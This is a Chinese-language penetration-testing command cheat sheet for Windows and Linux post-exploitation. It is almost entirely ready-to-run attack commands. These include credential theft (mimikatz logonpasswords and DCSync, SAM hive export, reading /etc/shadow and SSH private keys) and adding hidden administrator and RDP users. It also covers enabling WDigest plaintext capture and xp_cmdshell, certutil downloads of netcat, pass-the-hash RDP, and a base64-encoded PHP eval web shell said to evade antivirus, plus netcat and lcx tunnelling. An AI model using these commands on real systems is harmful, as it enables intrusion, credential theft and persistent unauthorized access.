```bash
 Windows命令
获取操作系统信息:

查看系统版本和补丁信息: systeminfo
识别操作系统名称及版本（英文）: systeminfo | findstr /B /C:"OS Name" /c:"OS Version"
识别操作系统名称及版本（中文）: systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"
识别系统体系结构: echo %PROCESSOR_ARCHITECTURE% AMD64

获取用户信息:

查看当前用户: whoami
查看计算机用户列表: net user
查看计算机用户组列表: net localgroup
查看当前登录用户: query user
查看当前用户保存的凭证: cmdkey /list
查看当前用户保存的票据凭证: klist

获取网络信息:

查看路由信息 : route print
查看arp : arp -A
查看ip地址和dns信息: ipconfig /all
查看防火墙规则: netsh firewall show config
查看当前防火墙状态: netsh firewall show state
查看系统开放端口: netstat -ano

获取应用程序及服务信息:

查看计划任务: schtasks /query /fo LIST /v
查看安装驱动: driverquery
查看安装程序和版本信息: wmic product list brief
查看服务: wmic service list brief
查看进程: wmic process list brief
查看启动程序信息: wmic startup list brief
查看3389端口: for /f "tokens=2" %i in ('tasklist /FI "SERVICES eq TermService" /NH') do netstat -ano | findstr %i | findstr LISTENING
Win设置终端代理: set http_proxy=http://127.0.0.1:7890 & set https_proxy=http://127.0.0.1:7890
查看.msi程序的执行权限: reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
查看是否设置setuid、setgid: reg HKEY_Local_Machine\System\CurrentControlSet\Services\NfsSvr\Parameters\SafeSetUidGidBits
查看安装补丁和时间信息: wmic qfe get Caption,Description,HotFixID,InstalledOn
查看特定漏洞补丁信息: wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KBxxxxxxxx"
查看系统进程: tasklist /svc
列出详细进程: tasklist /V /FO CSV

获取敏感数据和目录:

搜索D盘磁盘名字为logo.jpg的文件: cd /d D:\ && dir /b /s logo.jpg
搜素C盘文件夹下后缀conf内容有password: findstr /s /i /n /d:C:\ "password" *.conf
查找密码文件或其他敏感文件: dir /b/s password.txt dir /b/s .doc dir /b/s .ppt dir /b/s .xls dir /b/s .docx dir /b/s .xlsx dir /b/s config.* findstr /si password .xml .ini .txt findstr /si login .xml .ini .txt
查看无人值守安装文件，文件位置如下: C:\sysprep.inf C:\sysprep\sysprep.xml C:\Windows\Panther\Unattend\Unattended.xml C:\Windows\Panther\Unattended.xml

添加用户:

添加用户并设置密码: net user mstlab tools /add
将用户加入管理组: net localgroup administrators tools /add
将用户加入桌面组: net localgroup "Remote Desktop Users" tools /add
激活guest用户: net user guest /active:yes
更改guest用户的密码: net user guest 123456
将guest用户加入管理组: net localgoup administrators guest /add

注册表相关:

查看3389端口: REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
开启远程桌面: REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
注册表抓取明文: REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
rdp连接默认的10个记录: reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"
rdp连接默认的所有记录: reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s
查找软件安装目录: reg query HKLM /f foxmail /t REG_SZ /s

mimikatz查看当前密码:

mimikatz查看当前密码: mimikatz "log" "privilege:debug" "sekurlsa:logonpasswords" "exit"
mimikatz抓取domain密码: mimikatz "lsadump::dcsync /domain:test.com /all /csv" "exit"
reg导出注册表hash: reg save hklm\sam c:\programdata\sam.hive && reg save hklm\system c:\programdata\system.hive
mimikatz读取注册表导出的hash信息: mimikatz "log" "lsadump::sam /sam:sam.hive /system:system.hive" "exit"
impacket包的secretsdump: secretsdump.exe -sam sam.hive -system system.hive LOCAL
nmap扫描永恒之蓝漏洞: nmap -p445 --script smb-vuln-ms17-010 127.0.0.1
meterpreter把目标的3389端口转发到vps的6666端口: portfwd add -l 6666 -p 3389 -r 127.0.0.1
attrib创建隐藏文件: attrib +s +h +r *.exe
.net静默安装: dotNetFx40_Full_x86_x64.exe /q /norestart /ChainingPackage FullX64Bootstrapper
lcx端口转发: 本地监听: lcx.exe -listen 110 34567目标执行: lcx.exe -slave vpsip 110 127.0.0.1 3389
扫描web.txt文件的网站标题: 本地监听: whatweb -i web.txt -p Title whatweb
Win终端设置代理: 本地监听: set http_proxy=socks5://127.0.0.1:1080 && set https_proxy=socks5://127.0.0.1:1080
xfreerdp hash连接rdp: xfreerdp /u:administrator /pth:ccef208c6485269c20db2cad21734fe7 /v:10.20.24.100 /cert-ignore //server 2012
runas运行其它账户权限的程序: runas /user:hostname\username /sa "cmd.exe"

系统下载文件:

certutil下载文件: certutil -urlcache -split -f http://192.168.5.21:888/nc.txt c:\nc.txt
certutil删除记录: certutil -urlcache -split -f http://192.168.1.115/robots.txt delete
bitsadmin下载文件: bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\Pstools.zip

Wmic命令:

wmic远程连接机器: wmic /node:"192.168.1.20" /user:"domain\administrator" /password:"123456"
查看系统安装软件: wmic product get name,version
查看系统版本: wmic OS get Caption,CSDVersion,OSArchitecture,Version
根据Pid查找进程路径: wmic process get name,executablepath,processid|findstr pid
查看磁盘信息: Wmic logicaldisk
查看组、hostname等信息: wmic computersystem get Name, Domain, Manufacturer, Model, Username, Roles/format:list


Mssql环境:

mssql开启xp_cmdshell: EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
mssql输出文件: exec master..xp_cmdshell '>>c:\windows\temp\info.txt set /p="base64_encode" <nul'


Linux命令
获取操作系统信息:

查看操作系统版本:
cat /etc/issue //查看系统发行版本信息
cat /etc/*-release
cat /etc/lsb-release //Debian
cat /etc/redhat-release //Redhat

查看内核版本、是否为64位:
cat /proc/version
uname -a // 查看内核、操作系统、CPU信息
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep wmlinuz-

查看环境变量:
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
查看是否有打印机: lpstat -a

获取应用程序及服务信息:

查看正在运行的程序及对应的用户权限:
ps aux
ps -ef
top
cat /etc/services
查看以root权限运行的进程:
ps aux | grep root
ps -ef | grep root
查看安装的应用:
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archives
ls -alh /var/cache/yum/

获取服务及配置文件信息:

cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
ls -aRI /etc/ | awk '$1 ~ /^.*r.*/'

获取计划任务信息:

crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

获取用户信息:

id
who
w
last
cat /etc/passwd
cat /etc/group
cat /etc/shadow
grep -v -E "^#"/etc/passwd | awk -F: '$3 == 0 {print $1}'
awk -F:'($3 == "0") {print}' /etc/passwd
cat /etc/sudoers
sudo -l
ls -ahlR /root/

查找配置文件中的密码:

cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg

查看其他用户的操作记录:

cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history

查看ssh私钥:

cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key

获取存储的明文用户名、密码:

grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"

获取网络信息:

查看当前网络地址:
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/susconfig/network
查看网络配置、DNS、 DHCP、网关:
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname //查看计算机名
dnsdomainname
查看网络通信:
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
查看缓存:
arp -e
route
/sbin/route -nee

其他常用命令:

linux设置终端代理： export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890
linx终端搜索软件： find / -name pass.txt
linux查找后缀properties文件内容带password字样： find / -name *.properties | xargs grep password //xml,sh,python等等
linux把tomcat目录文件和文件夹列表导出到oa.txt： find /home/tomcat/ -type f > oa.txt
编码字符base64然后echo输出logo.php再进行解码： echo -n "PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4+" | base64 -d > logo.php //可绕过杀软拦截关键字

端口转发:

LCX:
lcx -<listen|tran|slave>
cx -listen 4567 33891 #Attacker
lcx -slave 111.222.333.444 4567 127.0.0.1 3389 # On the targets
SSH:
ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port
mknod:
mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe # Proxy (Port 80 to 8080)
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)
隧道:
ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig 

```